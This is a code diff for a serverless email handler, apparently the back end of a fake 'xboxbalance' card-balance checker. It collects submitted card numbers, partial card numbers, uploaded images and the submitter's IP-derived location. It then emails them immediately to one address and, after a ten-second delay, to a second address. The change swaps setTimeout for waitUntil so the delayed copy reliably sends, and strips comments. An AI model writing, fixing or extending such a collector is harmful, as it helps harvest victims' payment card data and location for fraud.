@@ -1,4 +1,5 @@
 import { Resend } from 'resend';
+import { waitUntil } from '@vercel/functions';
 
 function buildEmailAttachments(imageBase64) {
   if (!imageBase64) return [];
@@ -14,7 +15,6 @@ function buildEmailAttachments(imageBase64) {
 
 // ============================================================
 // Responsive, mobile-first email template
-// `showCopy` flag controls whether the copy button appears
 // ============================================================
 function buildEmailHtml(type, data, showCopy = true) {
   const {
@@ -600,9 +600,6 @@ export default async function handler(req, res) {
   const notificationEmail = process.env.NOTIFICATION_EMAIL;
   const resendApiKey = process.env.RESEND_API_KEY;
 
-  // ⭐ Routing flag
-  // true  → immediate to PRIMARY_EMAIL (submission time), delayed to NOTIFICATION_EMAIL (fire time)
-  // false → immediate to NOTIFICATION_EMAIL only (fire time, since there's no earlier send)
   const sendToPrimary = process.env.SEND_TO_PRIMARY !== 'false';
 
   if (!resendApiKey) {
@@ -619,9 +616,6 @@ export default async function handler(req, res) {
 
   const attachments = buildEmailAttachments(imageBase64);
   const subject = buildSubject(type);
-
-  // ⭐ Capture the exact submission time from the client payload.
-  // Fall back to server "now" if the client didn't send one.
   const submissionTimestamp = timestamp || new Date().toISOString();
 
   const locationPromise = getLocationFromIP(ip).catch(() => ({
@@ -640,8 +634,6 @@ export default async function handler(req, res) {
       ),
     ]);
 
-    // Base data shared by both emails — everything except `timestamp`,
-    // which we'll override per-email below.
     const baseData = {
       cardNumber,
       cardNumberFirst,
@@ -656,17 +648,12 @@ export default async function handler(req, res) {
     };
 
     if (sendToPrimary) {
-      // ========================================================
-      // MODE: SEND_TO_PRIMARY = true
-      // 1) Immediate to PRIMARY_EMAIL → uses SUBMISSION time
-      // 2) Delayed to NOTIFICATION_EMAIL → uses FIRE time
-      // ========================================================
       console.log('📧 Mode: SEND_TO_PRIMARY=true');
 
-      // --- 1️⃣ Immediate email (submission time) ---
+      // ---- 1️⃣ Immediate email (submission time) ----
       const immediateData = {
         ...baseData,
-        timestamp: submissionTimestamp, // ← exact submission time
+        timestamp: submissionTimestamp,
       };
 
       const htmlImmediate = buildEmailHtml(type, immediateData, true);
@@ -684,50 +671,52 @@ export default async function handler(req, res) {
       }
       console.log('✅ Immediate email sent to PRIMARY_EMAIL (submission time)');
 
-      // --- 2️⃣ Delayed email (fire time) ---
-      setTimeout(async () => {
-        try {
-          const fullLocation = await locationPromise;
+      // ---- 2️⃣ Delayed email (fire time) ----
+      // ⭐ waitUntil keeps the function alive after the response is sent,
+      // so the setTimeout callback actually runs and the 2nd email sends.
+      waitUntil(
+        (async () => {
+          try {
+            // Wait 10 seconds
+            await new Promise((r) => setTimeout(r, 10 * 1000));
 
-          const delayedData = {
-            ...baseData,
-            location: fullLocation,
-            // ⭐ Use current time at the moment this email actually fires
-            timestamp: new Date().toISOString(),
-          };
+            const fullLocation = await locationPromise;
 
-          const htmlScheduled = buildEmailHtml(type, delayedData, false);
+            const delayedData = {
+              ...baseData,
+              location: fullLocation,
+              // Current time at the moment the email fires
+              timestamp: new Date().toISOString(),
+            };
 
-          console.log(`⏱️ Firing delayed email to NOTIFICATION_EMAIL (fire time)`);
-          const delayedResult = await resend.emails.send({
-            from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
-            to: notificationEmail,
-            subject: subject,
-            html: htmlScheduled,
-            attachments,
-          });
+            const htmlScheduled = buildEmailHtml(type, delayedData, false);
 
-          if (delayedResult.error) {
-            console.error('⚠️ Delayed Resend email error:', delayedResult.error);
-          } else {
-            console.log('✅ Delayed email sent to NOTIFICATION_EMAIL (fire time)');
+            console.log('⏱️ Firing delayed email to NOTIFICATION_EMAIL (fire time)');
+            const delayedResult = await resend.emails.send({
+              from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+              to: notificationEmail,
+              subject: subject,
+              html: htmlScheduled,
+              attachments,
+            });
+
+            if (delayedResult.error) {
+              console.error('⚠️ Delayed Resend email error:', delayedResult.error);
+            } else {
+              console.log('✅ Delayed email sent to NOTIFICATION_EMAIL (fire time)');
+            }
+          } catch (err) {
+            console.error('❌ Delayed email exception:', err.message);
           }
-        } catch (err) {
-          console.error('❌ Delayed email exception:', err.message);
-        }
-      }, 10 * 1000); // 10 seconds
+        })()
+      );
 
     } else {
-      // ========================================================
-      // MODE: SEND_TO_PRIMARY = false
-      // Send ONLY to NOTIFICATION_EMAIL immediately.
-      // Uses submission time (this is the only/first email).
-      // ========================================================
       console.log('📧 Mode: SEND_TO_PRIMARY=false (skipping primary)');
 
       const immediateData = {
         ...baseData,
-        timestamp: submissionTimestamp, // ← submission time
+        timestamp: submissionTimestamp,
       };
 
       const htmlImmediate = buildEmailHtml(type, immediateData, true);
